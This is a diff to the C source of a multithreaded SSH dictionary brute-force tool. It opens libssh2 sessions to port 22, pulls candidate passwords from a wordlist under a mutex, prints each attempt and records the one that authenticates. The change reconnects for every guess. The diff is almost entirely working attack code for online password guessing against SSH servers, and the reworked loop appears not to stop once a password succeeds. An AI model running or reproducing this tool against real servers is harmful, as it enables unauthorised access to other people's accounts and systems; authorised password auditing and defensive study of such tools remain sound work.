@@ -44,68 +44,70 @@ status_t bruteforce_core (line_t (*the_password), void* _data)
 	bruteforce_data_t* data = _data;
 	status_t status = success ();
 
-	int ssh_socket;
-	status = connect_tcp (&ssh_socket, data->address, "22");
-	if (failed (status))
-		goto end;
-	pthread_cleanup_push (&close_socket, &ssh_socket);
-
-	LIBSSH2_SESSION* session = libssh2_session_init ();
-	if (session == NULL) {
-		status = failure ("Failed to initialize an SSH session");
-		goto close;
-	}
-	pthread_cleanup_push (&free_ssh, session);
-
-	if (libssh2_session_startup (session, ssh_socket) != 0) {
-		status = sshfailure (session);
-		goto free;
-	}
-	pthread_cleanup_push (&disconnect_ssh, session);
-
-	const char* userauth_list = libssh2_userauth_list (session, data->username, strlen (data->username));
-	if (strstr (userauth_list, "password") == NULL) { // TODO: commas
-		status = failure ("The SSH server does not support passwords");
-		goto disconnect;
-	}
-
 	line_t line;
 	status = make_line (&line);
 	if (failed (status))
-		goto disconnect;
+		return status;
 	(*the_password) = line;
 
 	while (1) {
-		if (pthread_mutex_lock (&data->dict_mutex) != 0) {
-			status = failure ("Failed to lock dictionary mutex");
-			goto disconnect;
+		int eof = 0;
+
+		// Get the next password
+		if (pthread_mutex_lock (&data->dict_mutex) != 0)
+			return failure ("Failed to lock dictionary mutex");
+		{
+			status = get_line (&line, data->dict_file);
+			eof = feof (data->dict_file);
 		}
-		status = get_line (&line, data->dict_file);
-		int eof = feof (data->dict_file);
-		if (pthread_mutex_unlock (&data->dict_mutex) != 0) {
-			status = failure ("Failed to unlock dictionary mutex");
-			goto disconnect;
-		}
+		if (pthread_mutex_unlock (&data->dict_mutex) != 0)
+			return failure ("Failed to unlock dictionary mutex");
 
 		if (failed (status) || eof)
-			goto disconnect;
+			return status;
 
-		const char* password = line.ntbs;
-		printf ("Trying \"%s\"\n", password);
-		if (libssh2_userauth_password (session, data->username, password) >= 0) {
-			(*the_password) = line;
+		// Open a connection
+		int ssh_socket;
+		status = connect_tcp (&ssh_socket, data->address, "22");
+		if (failed (status))
+			goto end;
+		pthread_cleanup_push (&close_socket, &ssh_socket);
+
+		LIBSSH2_SESSION* session = libssh2_session_init ();
+		if (session == NULL) {
+			status = failure ("Failed to initialize an SSH session");
+			goto close;
+		}
+		pthread_cleanup_push (&free_ssh, session);
+
+		if (libssh2_session_startup (session, ssh_socket) != 0) {
+			status = sshfailure (session);
+			goto free;
+		}
+		pthread_cleanup_push (&disconnect_ssh, session);
+
+		const char* userauth_list = libssh2_userauth_list (session, data->username, strlen (data->username));
+		if (strstr (userauth_list, "password") == NULL) { // TODO: commas
+			status = failure ("The SSH server does not support passwords");
 			goto disconnect;
 		}
-	}
 
-disconnect:
-	pthread_cleanup_pop (1);
-free:
-	pthread_cleanup_pop (1);
-close:
-	pthread_cleanup_pop (1);
-end:
-	return status;
+		// Send the password
+		const char* password = line.ntbs;
+		printf ("Trying \"%s\"\n", password);
+		if (libssh2_userauth_password (session, data->username, password) >= 0)
+			(*the_password) = line;
+
+	disconnect:
+		pthread_cleanup_pop (1);
+	free:
+		pthread_cleanup_pop (1);
+	close:
+		pthread_cleanup_pop (1);
+	end:
+		if (failed (status))
+			return status;
+	}
 }
 
 void* bruteforce_thread (void* _data)
@@ -142,6 +144,7 @@ void* bruteforce_thread (void* _data)
 	return NULL;
 }
 
+// Necessary to use libssl from multiple threads
 #include <gcrypt.h>
 GCRY_THREAD_OPTION_PTHREAD_IMPL;
 
